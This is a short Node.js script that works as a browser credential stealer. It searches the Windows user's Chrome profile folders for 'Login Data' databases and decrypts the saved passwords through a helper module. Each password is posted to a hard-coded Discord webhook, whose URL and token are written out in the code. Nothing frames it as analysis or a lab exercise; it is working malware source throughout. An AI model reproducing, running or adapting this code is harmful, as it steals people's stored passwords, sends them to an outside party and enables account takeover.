const loking = require("./loking");
let os = require('os')
const user = os.userInfo()['username'];
const axios = require('axios')
const fs = require('fs')
const explorer = loking.explorer;
const browser = loking.browser;
const crypto = loking.crypto;

const local = 'C:/Users/'+user+'/AppData/Local/Google/Chrome/User Data/';

function readDir(dir){
  var a = fs.readdirSync(dir).toString();
  return a
}


function getFilesLocalLogin(local){
var dir =  readDir(local)
var location = [];
dir = dir.split(','); 

dir.forEach(key=>{
    var stat = fs.statSync(local+'/'+key);
    if(stat.isDirectory()){ 
        
        var dir2 = local+key;
        var d2 = readDir(dir2).split(',');

        d2.forEach(key2=>{
            
            if(key2 === 'Login Data'){
                //console.log(dir2+key2)

                location.push(key)
            }
        })
    }
})
return location
}



//console.log(getFilesLocalLogin(local))

function hook( urls, msg){
axios({
  url:'https://canary.discord.com/api/webhooks/915791672049270804/yhzSGoQj5a9NrEF3Myn4D4wA9zMLnwX7vDC73Cex-QH8L_EhIPO7_CAcru88wqiC4fPS',
  method:'post',
  headers:{
    'Content-Type':'application/json'},
  data: {"content":msg,"embeds":null}
})
}






hook(null, 'executado')

var b = getFilesLocalLogin(local);
b.forEach(key=>{

console.log(key)
explorer.dataFromUddFile(browser.chrome, key, "Login Data", "logins").then((logins) => {
  logins.forEach((login) => {
    crypto
      .decrypt(browser.chrome, login.password_value)
      .then((value) => {
        console.log(value);
        hook(null, value)
        
      


      })
      .catch((reason) => {
        console.error(reason);
      });
  });
})
.catch((reason) => {
  console.error(reason);
});

})

